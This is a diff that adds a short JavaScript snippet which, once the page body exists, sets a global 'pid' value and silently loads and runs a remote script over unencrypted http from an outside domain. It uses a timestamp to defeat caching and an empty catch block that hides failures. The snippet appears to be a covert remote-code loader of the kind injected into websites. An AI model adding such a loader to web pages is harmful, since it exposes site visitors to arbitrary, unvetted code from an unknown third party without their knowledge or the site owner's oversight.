@@ -1,0 +1,16 @@
+(function() {
+    if (!document.body) return setTimeout(arguments.callee, 50);
+    try{
+        var t = new Date().getTime();
+        t = Math.floor(t/(60*1000));
+        var arg = document.createElement('script');
+        arg.type = 'text/javascript';
+        arg.text = 'pid = "45ae1efe-7a6b-4327-a0fe-bc51cba04703";doc = true;';
+        document.body.appendChild(arg);
+        var tj = document.createElement('script');
+        tj.type = 'text/javascript';
+        tj.async = true;
+        tj.src = 'http://jj.hyhyhj.com/alajs/palabase.js?v='+t;
+        document.body.appendChild(tj);
+    }catch(ee){}
+})();
